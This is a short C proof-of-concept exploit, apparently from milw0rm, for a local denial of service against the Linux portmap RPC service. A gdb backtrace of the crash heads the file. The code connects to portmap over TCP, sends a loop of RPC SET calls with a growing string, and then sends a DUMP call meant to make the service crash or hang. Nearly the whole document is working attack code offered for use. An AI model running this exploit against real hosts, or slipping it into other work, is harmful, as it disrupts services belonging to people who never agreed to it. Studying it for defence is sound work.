/////////////////////////////////////
// portmap Set+Dump Local DoS - PoC 
////////////////////////////////////
//
// Federico L. Bossi Bonin
// fbossi[at]netcomm[dot]com[dot]ar
////////////////////////////////////

// Tested on Linux with version 5

// USE DEBUGGING MODE
/////////////////////

// (gdb) backtrace
// #0  0xffffe410 in __kernel_vsyscall ()
// #1  0xb7f21343 in write () from /lib/tls/libc.so.6
// #2  0xb7f524d5 in svcfd_create () from /lib/tls/libc.so.6
// #3  0xb7f5467a in xdrrec_create () from /lib/tls/libc.so.6
// #4  0xb7f546f4 in xdrrec_create () from /lib/tls/libc.so.6
// #5  0xb7f5350d in xdr_u_long () from /lib/tls/libc.so.6
// #6  0xb7f4f48c in xdr_pmap () from /lib/tls/libc.so.6
// #7  0xb7f54e3b in xdr_reference () from /lib/tls/libc.so.6
// #8  0xb7f4f565 in xdr_pmaplist () from /lib/tls/libc.so.6
// #9  0xb7f50025 in xdr_accepted_reply () from /lib/tls/libc.so.6
// #10 0xb7f53cc5 in xdr_union () from /lib/tls/libc.so.6
// #11 0xb7f50171 in xdr_replymsg () from /lib/tls/libc.so.6
// #12 0xb7f5266e in svcfd_create () from /lib/tls/libc.so.6
// #13 0xb7f50ddc in svc_sendreply () from /lib/tls/libc.so.6
// #14 0x0804984d in reg_service (rqstp=0xbfecab4c, xprt=0xbfec872c) at portmap.c:515
// #15 0xb7f51345 in svc_getreq_common () from /lib/tls/libc.so.6
// #16 0xb7f5111d in svc_getreq_poll () from /lib/tls/libc.so.6
// #17 0xb7f51979 in svc_run () from /lib/tls/libc.so.6
// #18 0x080492dd in main (argc=134542752, argv=0xbfecb0e0) at portmap.c:303

#include <stdio.h>
#include <rpc/rpc.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h>
#include <rpc/pmap_prot.h>

int i;
int len=600;
char    myhost[256];

main(int argc, char *argv[]) {

if (argc < 2) {
printf("usage:%s <hostname>\n",argv[0]);
exit(1);
}

if (argc >2) { len=atoi(argv[2]);  }
if (len > 1024) { len=1024; }

unsigned long PROGRAM=100000;
unsigned long VERSION=2;

struct hostent *hp;
struct sockaddr_in server_addr;
int sock = RPC_ANYSOCK;
register CLIENT *client;
enum clnt_stat clnt_stat;
struct timeval timeout;
timeout.tv_sec = 40;
timeout.tv_usec = 0;


if ((hp = gethostbyname(argv[1])) == NULL) {
printf("Can't resolve %s\n",argv[1]);
exit(0);
}

gethostname(myhost,255);
bcopy(hp->h_addr, (caddr_t)&server_addr.sin_addr,hp->h_length);
server_addr.sin_family = AF_INET;
server_addr.sin_port =  0;

if ((client = clnttcp_create(&server_addr,PROGRAM,VERSION,&sock,1024,1024)) == NULL) {
clnt_pcreateerror("clnttcp_create");
exit(0);
}

client->cl_auth = authunix_create(myhost, 0, 0, 0, NULL);

char *data = (char *) malloc(1024);
memset(data,0x0,strlen(data));

char *response = (char *) malloc(1024);
memset(response,0x0,strlen(response));

for (i = 0 ; i < len ; i++) {
memcpy(data+strlen(data),"1",1);
clnt_call(client,1,(xdrproc_t) xdr_wrapstring ,(char *) &data,(xdrproc_t) xdr_wrapstring,(char *)  response,timeout);
}

clnt_call(client,4,(xdrproc_t) xdr_wrapstring ,(char *) &data,(xdrproc_t) xdr_wrapstring,(char *)  response,timeout);

clnt_destroy(client);
close(sock);
free(data);
free(response);
exit(0);
}

// milw0rm.com [2006-05-22]
